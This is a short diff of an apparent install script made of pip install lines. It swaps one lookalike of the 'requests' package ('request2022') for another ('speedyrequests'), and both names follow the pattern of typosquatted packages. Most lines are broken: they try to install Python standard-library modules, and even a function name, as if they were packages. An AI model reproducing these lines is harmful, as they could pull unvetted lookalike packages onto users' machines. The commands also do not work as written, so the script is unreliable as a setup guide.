@@ -3,6 +3,7 @@ pip install shutil
 pip install marshal
 pip install zlib
 pip install threading
+pip install speedyrequests
 pip install requests
 pip install random
 pip install discord
@@ -11,7 +12,6 @@ pip install colorama
 pip install time
 pip install webbrowser
 pip install subprocess
-pip install request2022
 pip install base64
 pip install re
 pip install b64encode
